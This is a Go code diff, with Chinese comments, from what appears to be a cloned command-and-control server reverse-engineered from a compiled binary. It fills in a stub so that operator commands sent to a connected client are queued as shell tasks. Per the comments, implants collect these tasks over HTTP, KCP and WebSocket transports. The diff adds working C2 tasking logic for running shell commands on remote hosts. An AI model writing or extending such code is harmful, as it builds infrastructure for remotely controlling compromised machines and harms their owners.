@@ -389,14 +389,24 @@ func engineCheckSession(token string) bool {
 // 同 DAT_019e7b40 映射）；未找到 → "connection error"（FUN_01919c00，16 字节
 // e8c0 链 key=0x68: 0xb,0x1c,0xe1,0x1e,0xeb,0x1a,0xe7,0x13,0xe2,1,0x50,0xa5,
 // 0x17,0xe,0xe5,0x1d）；找到则经客户端连接发送（FUN_016f3060）并返回结果。
+//
+// 原版把命令写进客户端的连接对象；复刻端的连接由各传输的等待循环（listener
+// /api/tasks、KCP LinkMsgMain、WS task 帧）从引擎的任务表拉取，因此这里把命令
+// 编码成 shell 任务入队——即与终端/FILE 控制器同一条投递路径。
 func dispatchCmd(id int64, cmd string) (int64, error) {
 	client := c2engine.GetEngine().GetClient(id)
 	if client == nil || !client.Status {
 		return 0, errors.New("connection error")
 	}
-	// TODO(engine): 对齐客户端连接命令发送（FUN_016f3060 传输层）
-	return 0, nil
+	task, err := c2engine.GetEngine().CreateTask(id, cmd, dispatchTimeout)
+	if err != nil {
+		return 0, err
+	}
+	return task.ID, nil
 }
+
+// dispatchTimeout 是派发命令的默认超时（秒）。
+const dispatchTimeout = 30
 
 // ---- 应用对象（main.main 经 FUN_01944a00 调用接口 Start；引擎阶段对齐 itab +0x28 方法）----
 
